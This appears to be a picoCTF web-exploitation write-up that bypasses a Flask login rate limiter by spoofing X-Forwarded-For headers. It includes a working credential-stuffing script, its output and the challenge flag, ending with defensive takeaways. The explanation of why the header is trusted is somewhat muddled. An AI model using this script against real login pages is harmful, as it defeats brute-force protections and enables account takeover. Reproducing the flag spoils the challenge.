# PicoCTF – Fool the Lockout
**Category:** Web Exploitation  
**Difficulty:** Medium  
**Points:** 200  
**Author:** David Gaviria  
**Flag:** `picoCTF{f00l_7h4t_l1m1t3r_b56b614c}`

---

## Description

> Your friend is building a simple website with a login page. To stop brute forcing and credential stuffing, they've added an IP-based rate limit: exceed the attempt threshold and your IP is blocked for a while. They're convinced this makes guessing credentials impossible. Can you bypass the rate limit, log in, and capture the flag?

---

## Source Code Analysis

The app is a Flask app with IP-based rate limiting:

```python
MAX_REQUESTS = 10       # max failed attempts before lockout
EPOCH_DURATION = 30     # timeframe for failed attempts (seconds)
LOCKOUT_DURATION = 120  # lockout duration (seconds)
```

### The Vulnerability

The rate limiter identifies clients purely by IP:

```python
def exceeded_rate_limit() -> bool:
    client_ip = request.remote_addr
    ...
```

Flask's `request.remote_addr` returns the direct connection IP — but it **does not** validate or ignore the `X-Forwarded-For` header. In many Flask deployments behind proxies, this header is trusted to identify the real client IP.

By sending a fake `X-Forwarded-For` header with each batch of requests, the server can be tricked into treating every 9 attempts as coming from a brand new IP — effectively bypassing the lockout entirely.

---

## Exploitation

### Credential List

1500 username:password pairs in `creds-dump.txt`, format: `username;password`

The valid credentials were at line 8: `emely:tyrant`

### Bypass Script

```python
import requests
import random

def fake_ip():
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

url = "http://candy-mountain.picoctf.net:57319/login"
ip = fake_ip()

with open("creds-dump.txt", "r") as f:
    for i, line in enumerate(f):
        username, password = line.strip().split(";")
        
        if i % 9 == 0:
            ip = fake_ip()  # rotate fake IP every 9 attempts
        
        headers = {"X-Forwarded-For": ip}
        data = {"username": username, "password": password}
        response = requests.post(url, headers=headers, data=data)
        
        if "picoCTF" in response.text:
            print(f"FOUND! {username}:{password}")
            print(response.text)
            break
```

### Result

```
FOUND! emely:tyrant
...
<p class="flag-message">picoCTF{f00l_7h4t_l1m1t3r_b56b614c}</p>
```

---

## Flag

```
picoCTF{f00l_7h4t_l1m1t3r_b56b614c}
```

---

## Key Takeaways

- **IP-based rate limiting** is bypassable if the server blindly trusts `X-Forwarded-For` headers
- Attackers can rotate fake IPs with every batch of attempts to reset the lockout counter
- Proper mitigations include:
  - Account lockout (per username) instead of just IP-based lockout
  - CAPTCHA after N failed attempts
  - Only trust `X-Forwarded-For` from known trusted proxy IPs
  - Use a WAF or reverse proxy that strips/validates forwarded headers
- **Credential stuffing** works because users reuse passwords across services — always use unique passwords + a password manager
